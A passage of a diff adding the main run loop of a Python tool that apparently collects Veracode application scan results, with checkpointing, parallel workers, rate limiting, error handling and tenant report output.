+                         kind.capitalize(), path, detail.counts[kind])
+
+        if getattr(args, "layout_run", False) and not args.dry_run:
+            from helpers import output_layout
+            output_layout.mark_run(Path(args.output), "complete" if complete else "partial")
+
+        # Snapshot and tenant trend summary. After the reports, so they can
+        # never affect them; never on a dry run; never fatal; no API calls.
+        if not args.dry_run:
+            try:
+                from helpers import tenant_analytics
+                from helpers import tenant_report
+                trep, sp = tenant_report.finish_run(
+                    h_rows, bundle, guid_by_id, args, skip_checks,
+                    complete=complete, issue_records=agg_records)
+                if sp is not None:
+                    log.info("[+] Snapshot: %s%s", sp, "" if complete else " (partial run)")
+                for line in tenant_analytics.summary_lines(trep):
+                    log.info("[*] %s", line)
+                if not args.no_html:
+                    hp = tenant_report.write_html(trep, args, client)
+                    log.info("[+] Tenant report: %s", hp)
+            except Exception as e:
+                log.warning("Tenant snapshot, summary or HTML skipped (reports are unaffected): %s", e)
+
+        if client is not None:
+            for line in client.limiter.report():
+                log.info("[*] Rate %s", line)
+            if client.auth_retry_events:
+                log.warning("[!] %d authentication retry event(s); %d request(s) abandoned. "
+                            "Check whether the API credentials were rotated or revoked mid-run.",
+                            client.auth_retry_events, client.auth_give_ups)
+            if client.net_retry_events:
+                log.warning("[!] %d network-level retry event(s).", client.net_retry_events)
+        if failures:
+            log.warning("[!] %d application(s) could not be retrieved and are marked "
+                        "'Error' in the report (not 'No Scan'): %s",
+                        len(failures), ", ".join(failures[:10])
+                        + (" ..." if len(failures) > 10 else ""))
+        _print_summary(h_rows)
+
+    client: VeracodeClient | None = None
+    exit_code = 0
+    try:
+        client = VeracodeClient(args.region, timeout=args.timeout,
+                                pool_size=max(16, args.parallel * 2),
+                                rate_budget=args.rate_budget,
+                                max_retries=args.max_retries,
+                                backoff_factor=args.retry_backoff,
+                                auth_retry_window=args.auth_retry_window)
+        log.info("[*] Region: %s | rate budget %.0f%% of limits "
+                 "(report %.0f/min, xml %.0f/min, rest %.0f/min)",
+                 args.region, args.rate_budget,
+                 *(client.limiter.buckets[b].target_rpm for b in ("report", "xml", "rest")))
+        apps = client.get_apps()
+        log.info("[*] Found %d apps", len(apps))
+        guid_by_id.update({str(a.get("legacy_id")): str(a.get("app_id") or "")
+                           for a in apps if a.get("legacy_id")})
+
+        if name_filter:
+            apps = [a for a in apps if name_filter.search(a["name"])]
+            log.info("[*] Filtered to %d apps", len(apps))
+        if args.max_apps:
+            apps = apps[:args.max_apps]
+
+        pending = [a for a in apps if (a["name"], "") not in skip_set]
+        if len(pending) != len(apps):
+            log.info("[*] %d already checkpointed, %d remaining",
+                     len(apps) - len(pending), len(pending))
+        log.info("[*] Plan: %s", _plan_note(len(pending), args.include_sandboxes,
+                                            args.rate_budget))
+
+        if args.dry_run:
+            print(f"Would process {len(pending)} apps:")
+            for a in pending:
+                print(f"  {a['name']} (id={a.get('legacy_id')})")
+            ckpt.close(); detail.close()
+            return
+
+        stop = threading.Event()
+        lock = threading.Lock()
+        progress = Progress(len(pending), already_done=len(skip_set))
+
+        def _do_app(idx_app: tuple[int, dict]) -> None:
+            if stop.is_set():
+                return
+            idx, app = idx_app
+            log.debug("[%d/%d] %s (id=%s)", idx, len(pending), app["name"], app.get("legacy_id"))
+            errored = False
+            try:
+                sr, mr, fr, rr, ai, tr = _process_app(
+                    client, app, args.skip_no_scan, args.include_sandboxes,
+                    skip_checks, prev_data, skip_set)
+                mod_rows = [m.to_row() for m in mr]
+                file_rows = [f.to_row() for f in fr]
+                if args.detail == "csv":
+                    # Written before the checkpoint record, so a crash can only
+                    # ever leave detail rows for a profile that is replayed.
+                    detail.write("modules", mod_rows)
+                    detail.write("files", file_rows)
+                elif args.detail == "xlsx":
+                    with lock:
+                        buffered_mods.extend(mod_rows)
+                        buffered_files.extend(file_rows)
+                # Even when nothing came back (--skip-no-scan), record the key so
+                # a resumed run does not re-fetch this profile.
+                keys = [(s.app_name, s.sandbox) for s in sr] or [(app["name"], "")]
+                ckpt.record(keys,
+                            health=[s.to_row() for s in sr],
+                            recs=[r.to_row() for r in rr],
+                            trends=[t.to_row() for t in tr],
+                            agg=[asdict(a) for a in ai])
+                for s in sr:
+                    sb = f' [{s.sandbox}]' if s.sandbox else ""
+                    log.debug("    %s | Issues: %d%s", s.health, s.total_issues, sb)
+            except AuthError as e:
+                log.error("Authentication failed: %s", e)
+                stop.set()
+                raise
+            except Exception as e:
+                errored = True
+                log.warning("    [!] %s: %s: %s", app["name"], type(e).__name__, e)
+                with lock:
+                    failures.append(app["name"])
+                ckpt.record([(app["name"], "")],
+                            health=[_error_result(app, app.get("legacy_id", 0),
+                                                  f"{type(e).__name__}: {e}").to_row()])
+            progress.tick(error=errored)
+
+        try:
+            if args.parallel > 1:
+                pool = ThreadPoolExecutor(max_workers=args.parallel)
+                try:
+                    futs = {pool.submit(_do_app, (i, a)): a for i, a in enumerate(pending, 1)}
+                    for fut in as_completed(futs):
+                        try:
+                            fut.result()
+                        except AuthError:
+                            for f in futs:
+                                f.cancel()
+                            stop.set()
+                            raise
+                        except Exception as e:
+                            log.warning("Worker error: %s", e)
+                finally:
+                    pool.shutdown(wait=True, cancel_futures=True)
+            else:
+                for i, app in enumerate(pending, 1):
+                    if stop.is_set():
+                        break
+                    _do_app((i, app))
+        except AuthError as e:
+            exit_code = 1
+            log.error("FATAL: %s", e)
+            log.error("[*] %d profile(s) are durable in the checkpoint; writing a partial "
+                      "report. Fix the credentials and rerun the same command to continue.",
+                      len(ckpt.done_keys))
+        except KeyboardInterrupt:
+            exit_code = 130
+            log.warning("[!] Interrupted. %d profile(s) durable in the checkpoint; "
+                        "writing a partial report.", len(ckpt.done_keys))
+
+    except AuthError as e:
+        exit_code = 1
+        log.error("FATAL: %s", e)
+    except KeyboardInterrupt:
+        exit_code = 130
+        log.warning("[!] Interrupted before collection started.")
+    finally:
+        ckpt.close()
+        detail.close()
+        try:
+            _finalize(client, complete=exit_code == 0)
+        except Exception as e:
+            log.error("Report write failed: %s", e)
+            log.error("Collected data is intact at %s. Rerun the same command to regenerate "
+                      "the report without re-scanning.", ckpt_path)
+            exit_code = exit_code or 3
+        if client is not None:
+            client.close()
+
+    if exit_code:
+        raise SystemExit(exit_code)
+
+
+if __name__ == "__main__":
+    main()
